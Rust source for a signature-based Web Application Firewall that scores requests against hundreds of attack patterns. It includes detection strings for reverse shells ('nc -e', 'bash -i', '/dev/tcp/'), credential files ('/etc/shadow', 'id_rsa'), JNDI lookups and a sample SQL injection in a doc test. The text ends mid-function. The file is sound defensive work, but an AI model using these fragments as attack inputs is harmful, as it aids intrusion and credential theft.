//! A fast, signature + anomaly-scoring Web Application Firewall.
//!
//! Inspired by the OWASP Core Rule Set: every matching rule adds its score;
//! the request is blocked when the total reaches the threshold (default 5).
//! Critical signatures score 5 (one match blocks), weaker indicators score
//! less and only block when combined.
//!
//! Inputs are **normalised** before matching to defeat common evasions:
//! double URL-decoding, `+` as space, HTML entities, lower-casing, SQL
//! comments (`UNION/**/SELECT`), whitespace runs, spaces around operators.
//!
//! All signatures are compiled into a single Aho-Corasick automaton, so
//! the cost is one linear pass per input whatever the number of rules.
//!
//! | Range | Category |
//! |---|---|
//! | 1xx | SQL injection |
//! | 2xx | Cross-site scripting |
//! | 3xx | Path traversal / local file inclusion |
//! | 4xx | OS command injection |
//! | 5xx | Log4Shell / JNDI / Spring4Shell / Shellshock |
//! | 6xx | SSRF / remote file inclusion |
//! | 7xx | NoSQL injection |
//! | 8xx | Server-side template injection |
//! | 9xx | Scanner probes (`/.env`, `/.git/`, `/wp-login.php` …) |
//! | 10xx | Protocol attacks (CRLF injection, NUL bytes) |

use std::borrow::Cow;
use std::fmt;
use std::sync::Arc;

use aho_corasick::{AhoCorasick, AhoCorasickBuilder, AhoCorasickKind, MatchKind};
use http::{StatusCode, request};

use crate::guard::impl_layer;
use crate::util::{any_path_matches, normalize_prefix, percent_decode};
use crate::{Context, Guard, Mode, Rejection, priority};

/// Attack category of a rule.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum Category {
    /// SQL injection.
    SqlInjection,
    /// Cross-site scripting.
    Xss,
    /// Path traversal / local file inclusion.
    PathTraversal,
    /// OS command injection.
    CommandInjection,
    /// Log4Shell, Spring4Shell, Shellshock and other RCE gadgets.
    RemoteCodeExecution,
    /// Server-side request forgery / remote file inclusion.
    Ssrf,
    /// NoSQL (MongoDB) operator injection.
    NoSqlInjection,
    /// Server-side template injection.
    TemplateInjection,
    /// Vulnerability scanner probes.
    ScannerProbe,
    /// Protocol level attacks (CRLF, NUL bytes).
    Protocol,
    /// User defined rule.
    Custom,
}

impl Category {
    /// Short name used in logs.
    pub fn as_str(self) -> &'static str {
        match self {
            Category::SqlInjection => "sqli",
            Category::Xss => "xss",
            Category::PathTraversal => "traversal",
            Category::CommandInjection => "cmdi",
            Category::RemoteCodeExecution => "rce",
            Category::Ssrf => "ssrf",
            Category::NoSqlInjection => "nosqli",
            Category::TemplateInjection => "ssti",
            Category::ScannerProbe => "scanner",
            Category::Protocol => "protocol",
            Category::Custom => "custom",
        }
    }
}

/// Where a rule looks. Combine with `|`.
pub mod target {
    /// URL path.
    pub const PATH: u8 = 1;
    /// Query string.
    pub const QUERY: u8 = 2;
    /// Header values.
    pub const HEADERS: u8 = 4;
    /// Bodies inspected with [`Waf::inspect_body`](super::Waf::inspect_body).
    pub const BODY: u8 = 8;
    /// Everything.
    pub const ALL: u8 = PATH | QUERY | HEADERS | BODY;
    /// Everything but the path.
    pub const ARGS: u8 = QUERY | HEADERS | BODY;
}

/// Sensitivity level. Higher levels enable more (noisier) rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default)]
pub enum Paranoia {
    /// Only high-confidence signatures (default, very low false positives).
    #[default]
    Low = 1,
    /// Adds weaker indicators that block in combination.
    Medium = 2,
    /// Adds very aggressive indicators (expect tuning).
    High = 3,
}

/// One WAF rule.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Rule {
    /// Unique id.
    pub id: u16,
    /// Category.
    pub category: Category,
    /// Lower-case, normalised substring.
    pub pattern: Cow<'static, str>,
    /// Anomaly score added on match.
    pub score: u8,
    /// Minimum paranoia level enabling the rule.
    pub paranoia: Paranoia,
    /// Bit mask of [`target`]s.
    pub targets: u8,
}

use Category as C;
use Paranoia::{High as P3, Low as P1, Medium as P2};
use target::{ALL, ARGS, PATH as TP};

type Def = (u16, Category, &'static str, u8, Paranoia, u8);

#[rustfmt::skip]
const RULES: &[Def] = &[
    // ---- SQL injection -------------------------------------------------
    (100, C::SqlInjection, "union select", 5, P1, ALL),
    (101, C::SqlInjection, "union all select", 5, P1, ALL),
    (102, C::SqlInjection, "union distinct select", 5, P1, ALL),
    (103, C::SqlInjection, " or 1=1", 5, P1, ALL),
    (104, C::SqlInjection, "'or 1=1", 5, P1, ALL),
    (105, C::SqlInjection, "' or '1'='1", 5, P1, ALL),
    (106, C::SqlInjection, "'or'1'='1", 5, P1, ALL),
    (107, C::SqlInjection, "\" or \"1\"=\"1", 5, P1, ALL),
    (108, C::SqlInjection, "' or 'a'='a", 5, P1, ALL),
    (109, C::SqlInjection, "' or ''='", 5, P1, ALL),
    (110, C::SqlInjection, "' or true", 4, P1, ALL),
    (111, C::SqlInjection, " or true--", 5, P1, ALL),
    (112, C::SqlInjection, "' and 1=1", 4, P1, ALL),
    (113, C::SqlInjection, "' and '1'='1", 4, P1, ALL),
    (114, C::SqlInjection, "' and 1=2", 4, P1, ALL),
    (115, C::SqlInjection, "'--", 3, P1, ALL),
    (116, C::SqlInjection, "' --", 3, P1, ALL),
    (117, C::SqlInjection, "information_schema", 5, P1, ALL),
    (118, C::SqlInjection, "pg_sleep(", 5, P1, ALL),
    (119, C::SqlInjection, "sleep(", 3, P1, ARGS),
    (120, C::SqlInjection, "benchmark(", 4, P1, ARGS),
    (121, C::SqlInjection, "waitfor delay", 5, P1, ALL),
    (122, C::SqlInjection, "xp_cmdshell", 5, P1, ALL),
    (123, C::SqlInjection, "sp_executesql", 4, P1, ALL),
    (124, C::SqlInjection, "load_file(", 5, P1, ALL),
    (125, C::SqlInjection, "into outfile", 5, P1, ALL),
    (126, C::SqlInjection, "into dumpfile", 5, P1, ALL),
    (127, C::SqlInjection, "@@version", 4, P1, ALL),
    (128, C::SqlInjection, "group_concat(", 5, P1, ALL),
    (129, C::SqlInjection, "extractvalue(", 5, P1, ALL),
    (130, C::SqlInjection, "updatexml(", 5, P1, ALL),
    (131, C::SqlInjection, "sqlite_master", 5, P1, ALL),
    (132, C::SqlInjection, "pg_catalog", 4, P1, ALL),
    (133, C::SqlInjection, "sysobjects", 4, P1, ALL),
    (134, C::SqlInjection, "dbms_pipe.receive_message", 5, P1, ALL),
    (135, C::SqlInjection, "utl_http.request", 5, P1, ALL),
    (136, C::SqlInjection, ";drop table", 5, P1, ALL),
    (137, C::SqlInjection, ";drop database", 5, P1, ALL),
    (138, C::SqlInjection, ";shutdown", 4, P1, ALL),
    (139, C::SqlInjection, "having 1=1", 5, P1, ALL),
    (140, C::SqlInjection, "order by 1--", 4, P1, ALL),
    (141, C::SqlInjection, "select @@", 4, P1, ALL),
    (142, C::SqlInjection, ";declare @", 4, P1, ALL),
    (143, C::SqlInjection, "' union", 3, P1, ALL),
    (150, C::SqlInjection, "select * from", 3, P2, ARGS),
    (151, C::SqlInjection, "insert into", 2, P2, ARGS),
    (152, C::SqlInjection, "delete from", 2, P2, ARGS),
    (153, C::SqlInjection, "drop table", 3, P2, ARGS),
    (154, C::SqlInjection, "char(", 2, P2, ARGS),
    (155, C::SqlInjection, "concat(", 2, P2, ARGS),
    (156, C::SqlInjection, "exec(", 2, P2, ARGS),
    (157, C::SqlInjection, "--", 2, P2, ARGS),
    (158, C::SqlInjection, "';", 2, P2, ARGS),
    (159, C::SqlInjection, "' or ", 3, P2, ARGS),
    (160, C::SqlInjection, "\" or ", 2, P2, ARGS),
    (170, C::SqlInjection, " or ", 1, P3, ARGS),
    (171, C::SqlInjection, "'", 1, P3, ARGS),
    (172, C::SqlInjection, "#", 1, P3, ARGS),
    // ---- XSS ------------------------------------------------------------
    (200, C::Xss, "<script", 5, P1, ALL),
    (201, C::Xss, "</script", 5, P1, ALL),
    (202, C::Xss, "javascript:", 5, P1, ALL),
    (203, C::Xss, "vbscript:", 5, P1, ALL),
    (204, C::Xss, "livescript:", 4, P1, ALL),
    (205, C::Xss, "<iframe", 5, P1, ALL),
    (206, C::Xss, "<frame", 4, P1, ALL),
    (207, C::Xss, "<object", 4, P1, ALL),
    (208, C::Xss, "<embed", 4, P1, ALL),
    (209, C::Xss, "<applet", 4, P1, ALL),
    (210, C::Xss, "<svg", 4, P1, ALL),
    (211, C::Xss, "<math", 3, P1, ALL),
    (212, C::Xss, "<img", 3, P1, ALL),
    (213, C::Xss, "<body", 3, P1, ALL),
    (214, C::Xss, "<video", 3, P1, ALL),
    (215, C::Xss, "<audio", 3, P1, ALL),
    (216, C::Xss, "<details", 3, P1, ALL),
    (217, C::Xss, "<marquee", 3, P1, ALL),
    (218, C::Xss, "<isindex", 4, P1, ALL),
    (219, C::Xss, "<base", 3, P1, ALL),
    (220, C::Xss, "<meta", 3, P1, ALL),
    (221, C::Xss, "<style", 3, P1, ALL),
    (222, C::Xss, "document.cookie", 5, P1, ALL),
    (223, C::Xss, "document.domain", 4, P1, ALL),
    (224, C::Xss, "document.write", 4, P1, ALL),
    (225, C::Xss, "document.location", 3, P1, ALL),
    (226, C::Xss, "window.location", 3, P1, ALL),
    (227, C::Xss, ".innerhtml", 4, P1, ALL),
    (228, C::Xss, ".outerhtml", 4, P1, ALL),
    (229, C::Xss, "alert(", 4, P1, ALL),
    (230, C::Xss, "prompt(", 3, P1, ALL),
    (231, C::Xss, "confirm(", 3, P1, ALL),
    (232, C::Xss, "eval(", 4, P1, ALL),
    (233, C::Xss, "settimeout(", 3, P1, ALL),
    (234, C::Xss, "setinterval(", 3, P1, ALL),
    (235, C::Xss, "new function(", 4, P1, ALL),
    (236, C::Xss, "fromcharcode", 4, P1, ALL),
    (237, C::Xss, "atob(", 3, P1, ALL),
    (238, C::Xss, "srcdoc=", 4, P1, ALL),
    (239, C::Xss, "formaction=", 4, P1, ALL),
    (240, C::Xss, "xlink:href", 4, P1, ALL),
    (241, C::Xss, "data:text/html", 5, P1, ALL),
    (242, C::Xss, "expression(", 4, P1, ALL),
    (243, C::Xss, "-moz-binding", 4, P1, ALL),
    (244, C::Xss, "@import", 3, P1, ARGS),
    // 245 = event handler heuristic (`onerror=` …), see `has_event_handler`.
    (250, C::Xss, "<link", 2, P2, ALL),
    (251, C::Xss, "<form", 2, P2, ALL),
    (252, C::Xss, "<input", 2, P2, ALL),
    (253, C::Xss, "<a href", 2, P2, ALL),
    (254, C::Xss, "src=", 1, P2, ARGS),
    (255, C::Xss, "href=", 1, P2, ARGS),
    (256, C::Xss, "<", 1, P3, ARGS),
    (257, C::Xss, ">", 1, P3, ARGS),
    // ---- Path traversal / LFI -------------------------------------------
    (300, C::PathTraversal, "../", 5, P1, ALL),
    (301, C::PathTraversal, "..\\", 5, P1, ALL),
    (302, C::PathTraversal, "/etc/passwd", 5, P1, ALL),
    (303, C::PathTraversal, "/etc/shadow", 5, P1, ALL),
    (304, C::PathTraversal, "/proc/self/", 5, P1, ALL),
    (305, C::PathTraversal, "/proc/version", 4, P1, ALL),
    (306, C::PathTraversal, "c:\\windows\\", 5, P1, ALL),
    (307, C::PathTraversal, "c:/windows/", 4, P1, ALL),
    (308, C::PathTraversal, "boot.ini", 4, P1, ALL),
    (309, C::PathTraversal, "win.ini", 4, P1, ALL),
    (310, C::PathTraversal, "web-inf/", 4, P1, ALL),
    (311, C::PathTraversal, ".htaccess", 5, P1, ALL),
    (312, C::PathTraversal, ".htpasswd", 5, P1, ALL),
    (313, C::PathTraversal, "/.ssh/", 5, P1, ALL),
    (314, C::PathTraversal, "id_rsa", 4, P1, ALL),
    (315, C::PathTraversal, "php://", 5, P1, ALL),
    (316, C::PathTraversal, "phar://", 5, P1, ALL),
    (317, C::PathTraversal, "zip://", 4, P1, ALL),
    (318, C::PathTraversal, "expect://", 5, P1, ALL),
    (319, C::PathTraversal, "glob://", 4, P1, ALL),
    (320, C::PathTraversal, "/etc/hosts", 3, P1, ALL),
    (321, C::PathTraversal, "/var/log/", 3, P1, ALL),
    (330, C::PathTraversal, "/root/", 2, P2, ALL),
    (331, C::PathTraversal, "system32", 3, P2, ALL),
    (332, C::PathTraversal, "data://", 3, P2, ARGS),
    // ---- OS command injection (separator + command, generated) ----------
    (400, C::CommandInjection, "/bin/sh", 5, P1, ALL),
    (401, C::CommandInjection, "/bin/bash", 5, P1, ALL),
    (402, C::CommandInjection, "/bin/zsh", 5, P1, ALL),
    (403, C::CommandInjection, "cmd.exe", 5, P1, ALL),
    (404, C::CommandInjection, "cmd /c", 5, P1, ALL),
    (405, C::CommandInjection, "powershell", 4, P1, ALL),
    (406, C::CommandInjection, "/dev/tcp/", 5, P1, ALL),
    (407, C::CommandInjection, "/dev/udp/", 5, P1, ALL),
    (408, C::CommandInjection, "nc -e", 5, P1, ALL),
    (409, C::CommandInjection, "bash -i", 5, P1, ALL),
    (410, C::CommandInjection, "sh -i", 4, P1, ALL),
    (411, C::CommandInjection, "base64 -d", 4, P1, ALL),
    (412, C::CommandInjection, "${ifs}", 5, P1, ALL),
    (413, C::CommandInjection, "$ifs$", 4, P1, ALL),
    (414, C::CommandInjection, "python -c", 4, P1, ALL),
    (415, C::CommandInjection, "perl -e", 4, P1, ALL),
    (416, C::CommandInjection, "ruby -e", 4, P1, ALL),
    (417, C::CommandInjection, "php -r", 4, P1, ALL),
    (418, C::CommandInjection, "invoke-expression", 5, P1, ALL),
    (419, C::CommandInjection, "iex(", 4, P1, ALL),
    (420, C::CommandInjection, "certutil", 4, P1, ARGS),
    (421, C::CommandInjection, "mshta", 4, P1, ARGS),
    (422, C::CommandInjection, "rundll32", 4, P1, ARGS),
    (423, C::CommandInjection, "regsvr32", 4, P1, ARGS),
    (424, C::CommandInjection, "/usr/bin/", 3, P1, ALL),
    (430, C::CommandInjection, "`", 2, P2, ARGS),
    (431, C::CommandInjection, "$(", 2, P2, ARGS),
    // ---- RCE gadgets -----------------------------------------------------
    (500, C::RemoteCodeExecution, "${jndi:", 5, P1, ALL),
    (501, C::RemoteCodeExecution, "jndi:ldap:", 5, P1, ALL),
    (502, C::RemoteCodeExecution, "jndi:ldaps:", 5, P1, ALL),
    (503, C::RemoteCodeExecution, "jndi:rmi:", 5, P1, ALL),
    (504, C::RemoteCodeExecution, "jndi:dns:", 5, P1, ALL),
    (505, C::RemoteCodeExecution, "jndi:iiop:", 5, P1, ALL),
    (506, C::RemoteCodeExecution, "${lower:", 4, P1, ALL),
    (507, C::RemoteCodeExecution, "${upper:", 4, P1, ALL),
    (508, C::RemoteCodeExecution, "${env:", 4, P1, ALL),
    (509, C::RemoteCodeExecution, "${sys:", 4, P1, ALL),
    (510, C::RemoteCodeExecution, "${java:", 4, P1, ALL),
    (511, C::RemoteCodeExecution, "${::-", 5, P1, ALL),
    (512, C::RemoteCodeExecution, "${base64:", 4, P1, ALL),
    (513, C::RemoteCodeExecution, "${spring:", 4, P1, ALL),
    (514, C::RemoteCodeExecution, "class.module.classloader", 5, P1, ALL),
    (515, C::RemoteCodeExecution, "class.classloader", 5, P1, ALL),
    (516, C::RemoteCodeExecution, "(){ :;", 5, P1, ALL),
    (517, C::RemoteCodeExecution, "(){:;", 5, P1, ALL),
    (518, C::RemoteCodeExecution, "${date:", 3, P1, ALL),
    (519, C::RemoteCodeExecution, "${ctx:", 3, P1, ALL),
    // ---- SSRF / RFI ------------------------------------------------------
    (600, C::Ssrf, "169.254.169.254", 5, P1, ALL),
    (601, C::Ssrf, "metadata.google.internal", 5, P1, ALL),
    (602, C::Ssrf, "100.100.100.200", 4, P1, ALL),
    (603, C::Ssrf, "fd00:ec2::254", 5, P1, ALL),
    (604, C::Ssrf, "169.254.170.2", 4, P1, ALL),
    (605, C::Ssrf, "file://", 5, P1, ALL),
    (606, C::Ssrf, "gopher://", 5, P1, ALL),
    (607, C::Ssrf, "dict://", 4, P1, ALL),
    (608, C::Ssrf, "tftp://", 4, P1, ALL),
    (609, C::Ssrf, "ldap://", 3, P1, ALL),
    (610, C::Ssrf, "0x7f000001", 4, P1, ALL),
    (620, C::Ssrf, "127.0.0.1", 2, P2, ARGS),
    (621, C::Ssrf, "2130706433", 3, P2, ARGS),
    (622, C::Ssrf, "[::]", 2, P2, ARGS),
    (623, C::Ssrf, "localhost", 1, P3, ARGS),
    // ---- NoSQL -----------------------------------------------------------
    (700, C::NoSqlInjection, "[$ne]", 5, P1, ALL),
    (701, C::NoSqlInjection, "[$gt]", 4, P1, ALL),
    (702, C::NoSqlInjection, "[$gte]", 4, P1, ALL),
    (703, C::NoSqlInjection, "[$lt]", 4, P1, ALL),
    (704, C::NoSqlInjection, "[$lte]", 4, P1, ALL),
    (705, C::NoSqlInjection, "[$regex]", 5, P1, ALL),
    (706, C::NoSqlInjection, "[$where]", 5, P1, ALL),
    (707, C::NoSqlInjection, "[$exists]", 4, P1, ALL),
    (708, C::NoSqlInjection, "[$nin]", 4, P1, ALL),
    (709, C::NoSqlInjection, "[$or]", 4, P1, ALL),
    (710, C::NoSqlInjection, "\"$where\"", 5, P1, ALL),
    (711, C::NoSqlInjection, "\"$ne\"", 4, P1, ALL),
    (712, C::NoSqlInjection, "\"$gt\"", 4, P1, ALL),
    (713, C::NoSqlInjection, "\"$regex\"", 4, P1, ALL),
    (714, C::NoSqlInjection, "$where:", 4, P1, ALL),
    // ---- SSTI ------------------------------------------------------------
    (800, C::TemplateInjection, "{{7*7}}", 5, P1, ALL),
    (801, C::TemplateInjection, "${7*7}", 5, P1, ALL),
    (802, C::TemplateInjection, "#{7*7}", 5, P1, ALL),
    (803, C::TemplateInjection, "<%=", 4, P1, ALL),
    (804, C::TemplateInjection, "{{config", 5, P1, ALL),
    (805, C::TemplateInjection, "{{self", 5, P1, ALL),
    (806, C::TemplateInjection, "{{request", 4, P1, ALL),
    (807, C::TemplateInjection, "__class__", 5, P1, ALL),
    (808, C::TemplateInjection, "__mro__", 5, P1, ALL),
    (809, C::TemplateInjection, "__subclasses__", 5, P1, ALL),
    (810, C::TemplateInjection, "__globals__", 5, P1, ALL),
    (811, C::TemplateInjection, "__builtins__", 5, P1, ALL),
    (812, C::TemplateInjection, "__import__", 5, P1, ALL),
    (820, C::TemplateInjection, "{{", 2, P2, ARGS),
    (821, C::TemplateInjection, "{%", 2, P2, ARGS),
    (822, C::TemplateInjection, "${", 2, P2, ARGS),
    // ---- Scanner probes (path only) ------------------------------------
    (900, C::ScannerProbe, "/.env", 5, P1, TP),
    (901, C::ScannerProbe, "/.git/", 5, P1, TP),
    (902, C::ScannerProbe, "/.gitconfig", 4, P1, TP),
    (903, C::ScannerProbe, "/.svn/", 5, P1, TP),
    (904, C::ScannerProbe, "/.hg/", 4, P1, TP),
    (905, C::ScannerProbe, "/.bzr/", 4, P1, TP),
    (906, C::ScannerProbe, "/.ds_store", 4, P1, TP),
    (907, C::ScannerProbe, "/.aws/", 5, P1, TP),
    (908, C::ScannerProbe, "/.docker", 4, P1, TP),
    (909, C::ScannerProbe, "/.kube/", 4, P1, TP),
    (910, C::ScannerProbe, "/.npmrc", 4, P1, TP),
    (911, C::ScannerProbe, "/.bash_history", 5, P1, TP),
    (912, C::ScannerProbe, "/wp-admin", 4, P1, TP),
    (913, C::ScannerProbe, "/wp-login.php", 5, P1, TP),
    (914, C::ScannerProbe, "/wp-config", 5, P1, TP),
    (915, C::ScannerProbe, "/xmlrpc.php", 5, P1, TP),
    (916, C::ScannerProbe, "/phpmyadmin", 5, P1, TP),
    (917, C::ScannerProbe, "/adminer", 4, P1, TP),
    (918, C::ScannerProbe, "/phpinfo", 5, P1, TP),
    (919, C::ScannerProbe, "/vendor/phpunit", 5, P1, TP),
    (920, C::ScannerProbe, "/server-status", 4, P1, TP),
    (921, C::ScannerProbe, "/server-info", 4, P1, TP),
    (922, C::ScannerProbe, "/cgi-bin/", 4, P1, TP),
    (923, C::ScannerProbe, "/jmx-console", 4, P1, TP),
    (924, C::ScannerProbe, "/manager/html", 4, P1, TP),
    (925, C::ScannerProbe, "/boaform/", 5, P1, TP),
    (926, C::ScannerProbe, "/hnap1", 4, P1, TP),
    (927, C::ScannerProbe, "/_ignition/", 5, P1, TP),
    (928, C::ScannerProbe, "/telescope/", 3, P1, TP),
    (929, C::ScannerProbe, "/actuator/", 3, P1, TP),
    (930, C::ScannerProbe, "/wp-content/", 3, P1, TP),
    (931, C::ScannerProbe, "/wp-includes/", 3, P1, TP),
    (940, C::ScannerProbe, ".php", 2, P2, TP),
    (941, C::ScannerProbe, ".asp", 2, P2, TP),
    (942, C::ScannerProbe, ".jsp", 2, P2, TP),
    (943, C::ScannerProbe, ".cgi", 2, P2, TP),
    (944, C::ScannerProbe, ".sql", 3, P2, TP),
    (945, C::ScannerProbe, ".bak", 3, P2, TP),
    (946, C::ScannerProbe, ".swp", 3, P2, TP),
    (947, C::ScannerProbe, "/backup", 2, P2, TP),
    (948, C::ScannerProbe, ".old", 1, P3, TP),
    // ---- Protocol --------------------------------------------------------
    (1000, C::Protocol, "\0", 5, P1, ALL),
    // 1001 = CRLF header injection heuristic.
];

/// Commands detected after a shell separator (`;`, `|`, `&&`, `` ` ``, `$(`).
const SHELL_COMMANDS: &[&str] = &[
    "wget ",
    "curl ",
    "nc ",
    "ncat ",
    "bash",
    "sh ",
    "cat ",
    "id;",
    "id|",
    "whoami",
    "uname",
    "ping ",
    "nslookup ",
    "rm -",
    "chmod ",
    "python",
    "perl ",
    "php ",
    "ruby ",
    "powershell",
    "cmd ",
    "ls ",
    "echo ",
    "sleep ",
    "telnet ",
    "busybox",
];
const SHELL_SEPARATORS: &[&str] = &[";", "|", "&&", "`", "$("];

/// The decision of the WAF for one input.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct Verdict {
    /// Total anomaly score.
    pub score: u32,
    /// Ids of the matched rules.
    pub rules: Vec<u16>,
    /// Categories of the matched rules (deduplicated).
    pub categories: Vec<Category>,
    /// Whether the score reached the threshold.
    pub blocked: bool,
}

struct Engine {
    rules: Vec<Rule>,
    ac: AhoCorasick,
}

/// Web Application Firewall guard. See the [module docs](self).
///
/// ```
/// use securite::prelude::*;
/// use securite::waf::{Category, target};
///
/// let waf = Waf::new()
///     .paranoia(Paranoia::Medium)
///     .threshold(5)
///     .disable_rules([157])                       // "--" is legit in our app
///     .skip_paths(["/api/admin/sql-console"])
///     .custom_rule(5000, "evil-corp", 5, target::ALL);
///
/// assert!(waf.inspect_text("1' UNION/**/SELECT password FROM users--").blocked);
/// assert!(!waf.inspect_text("hello world").blocked);
/// ```
#[derive(Clone)]
pub struct Waf {
    engine: Arc<Engine>,
    paranoia: Paranoia,
    threshold: u32,
    disabled: Vec<u16>,
    disabled_categories: Vec<Category>,
    custom: Vec<Rule>,
    skip_paths: Vec<String>,
    inspect_headers: bool,
    skip_headers: Vec<String>,
    mode: Mode,
}

impl fmt::Debug for Waf {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("Waf")
            .field("rules", &self.engine.rules.len())
            .field("paranoia", &self.paranoia)
            .field("threshold", &self.threshold)
            .field("mode", &self.mode)
            .finish_non_exhaustive()
    }
}

impl Default for Waf {
    fn default() -> Self {
        Self::new()
    }
}

impl Waf {
    /// Paranoia [`Low`](Paranoia::Low), threshold 5, all built-in rules.
    pub fn new() -> Self {
        let mut waf = Self {
            engine: Arc::new(Engine {
                rules: Vec::new(),
                ac: AhoCorasick::new(["\u{0}never"]).expect("valid"),
            }),
            paranoia: Paranoia::Low,
            threshold: 5,
            disabled: Vec::new(),
            disabled_categories: Vec::new(),
            custom: Vec::new(),
            skip_paths: Vec::new(),
            inspect_headers: true,
            skip_headers: vec![
                "authorization".into(),
                "proxy-authorization".into(),
                "accept".into(),
                "accept-encoding".into(),
                "accept-language".into(),
                "content-length".into(),
                "content-type".into(),
                "if-none-match".into(),
                "if-modified-since".into(),
                "sec-ch-ua".into(),
                "sec-ch-ua-platform".into(),
                "sec-ch-ua-mobile".into(),
            ],
            mode: Mode::Enforce,
        };
        waf.rebuild();
        waf
    }

    /// Sensitivity level.
    pub fn paranoia(mut self, level: Paranoia) -> Self {
        self.paranoia = level;
        self.rebuild();
        self
    }

    /// Anomaly score at which a request is blocked (default 5).
    pub fn threshold(mut self, threshold: u32) -> Self {
        self.threshold = threshold.max(1);
        self
    }

    /// Disables rules by id (false-positive tuning).
    pub fn disable_rules(mut self, ids: impl IntoIterator<Item = u16>) -> Self {
        self.disabled.extend(ids);
        self.rebuild();
        self
    }

    /// Disables a whole category.
    pub fn disable_category(mut self, category: Category) -> Self {
        self.disabled
            .extend(RULES.iter().filter(|r| r.1 == category).map(|r| r.0));
        if category == Category::Xss {
            self.disabled.push(245);
        }
        if category == Category::Protocol {
            self.disabled.push(1001);
        }
        if category == Category::CommandInjection {
            self.disabled.push(450);
        }
        if !self.disabled_categories.contains(&category) {
            self.disabled_categories.push(category);
        }
        self.rebuild();
        self
    }

    /// Adds a custom signature (case-insensitive substring). The pattern is
    /// normalised exactly like the inspected inputs, so `"DROP  TABLE"` and
    /// `"drop table"` are equivalent. Use ids ≥ 5000 to avoid built-in ids.
    pub fn custom_rule(mut self, id: u16, pattern: &str, score: u8, targets: u8) -> Self {
        let pattern = normalize(pattern, false);
        assert!(!pattern.is_empty(), "empty WAF pattern");
        self.custom.push(Rule {
            id,
            category: Category::Custom,
            pattern: Cow::Owned(pattern),
            score,
            paranoia: Paranoia::Low,
            targets,
        });
        self.rebuild();
        self
    }

    /// Path prefixes not inspected.
    pub fn skip_paths<I, S>(mut self, prefixes: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        self.skip_paths
            .extend(prefixes.into_iter().map(normalize_prefix));
        self
    }

    /// Inspect header values (default `true`).
    pub fn inspect_headers(mut self, inspect: bool) -> Self {
        self.inspect_headers = inspect;
        self
    }

    /// Header names never inspected (in addition to the defaults such as
    /// `authorization`).
    pub fn skip_headers<I, S>(mut self, names: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        self.skip_headers
            .extend(names.into_iter().map(|n| n.as_ref().to_ascii_lowercase()));
        self
    }

    /// Monitor-only mode: log attacks without blocking.
    pub fn monitor(mut self) -> Self {
        self.mode = Mode::Monitor;
        self
    }

    /// Every active rule (built-in + custom).
    pub fn rules(&self) -> &[Rule] {
        &self.engine.rules
    }

    fn rebuild(&mut self) {
        let mut rules: Vec<Rule> = RULES
            .iter()
            .map(|&(id, category, pattern, score, paranoia, targets)| Rule {
                id,
                category,
                pattern: Cow::Borrowed(pattern),
                score,
                paranoia,
                targets,
            })
            .collect();
        for sep in SHELL_SEPARATORS {
            for cmd in SHELL_COMMANDS {
                rules.push(Rule {
                    id: 450,
                    category: Category::CommandInjection,
                    pattern: Cow::Owned(format!("{sep}{cmd}")),
                    score: 5,
                    paranoia: Paranoia::Low,
                    targets: target::ARGS,
                });
            }
        }
        rules.extend(self.custom.iter().cloned());
        rules.retain(|r| {
            r.paranoia <= self.paranoia
                && !self.disabled.contains(&r.id)
                && !self.disabled_categories.contains(&r.category)
        });
        let ac = AhoCorasickBuilder::new()
            .match_kind(MatchKind::Standard)
            .kind(Some(AhoCorasickKind::DFA))
            .build(rules.iter().map(|r| r.pattern.as_bytes()))
            .expect("valid WAF patterns");
        self.engine = Arc::new(Engine { rules, ac });
    }

    fn enabled(&self, id: u16) -> bool {
        !self.disabled.contains(&id)
    }

    /// Scores one normalised input against the rules for `tgt`.
    fn scan(&self, raw: &str, tgt: u8, is_query: bool, buf: &mut String, verdict: &mut Verdict) {
        // CRLF injection must be checked before whitespace normalisation.
        if self.enabled(1001) && tgt & (target::PATH | target::QUERY) != 0 && raw.contains('%') {
            let decoded = percent_decode(raw, is_query);
            if has_header_injection(&decoded, tgt == target::PATH) {
                add(verdict, 1001, Category::Protocol, 5);
            }
        }
        normalize_into(raw, is_query, buf);
        for m in self.engine.ac.find_overlapping_iter(buf.as_bytes()) {
            let rule = &self.engine.rules[m.pattern().as_usize()];
            if rule.targets & tgt != 0 {
                add(verdict, rule.id, rule.category, rule.score);
            }
        }
        if self.enabled(245) && tgt != target::PATH && has_event_handler(buf) {
            add(verdict, 245, Category::Xss, 5);
        }
    }

    /// Inspects an arbitrary text with the `BODY` rules (JSON, form fields,
    /// GraphQL queries …). Call it from your handlers on untrusted input.
    pub fn inspect_text(&self, text: &str) -> Verdict {
        self.inspect_body(text)
    }

    /// Same as [`inspect_text`](Self::inspect_text).
    pub fn inspect_body(&self, body: &str) -> Verdict {
        let mut v = Verdict::default();
        let mut buf = String::with_capacity(body.len());
        self.scan(body, target::BODY, true, &mut buf, &mut v);
        v.blocked = v.score >= self.threshold;
        v
    }

    /// Inspects a request head.
    pub fn inspect(&self, req: &request::Parts) -> Verdict {
        let mut v = Verdict::default();
        let mut buf = String::with_capacity(256);
        self.scan(req.uri.path(), target::PATH, false, &mut buf, &mut v);
        if let Some(q) = req.uri.query() {
            self.scan(q, target::QUERY, true, &mut buf, &mut v);
        }
        if self.inspect_headers {
            for (name, value) in &req.headers {
                if self
                    .skip_headers
                    .iter()
                    .any(|s| s.as_str() == name.as_str())
                {
                    continue;
                }
                let value = String::from_utf8_lossy(value.as_bytes());
                self.scan(&value, target::HEADERS, false, &mut buf, &mut v);
            }
        }
        v.blocked = v.score >= self.threshold;
        v
    }
}

fn add(v: &mut Verdict, id: u16, category: Category, score: u8) {
    if v.rules.contains(&id) {
        return;
    }
    v.rules.push(id);
    v.score += u32::from(score);
    if !v.categories.contains(&category) {
        v.categories.push(category);
    }
}

/// Lower-cases, decodes and canonicalises `input` into `out`.
pub fn normalize(input: &str, is_query: bool) -> String {
    let mut out = String::with_capacity(input.len());
    normalize_into(input, is_query, &mut out);
    out
}

fn normalize_into(input: &str, is_query: bool, out: &mut String) {
    out.clear();
    let once = percent_decode(input, is_query);
    let twice = if once.contains('%') {
        Cow::Owned(percent_decode(&once, false).into_owned())
    } else {
        once
    };
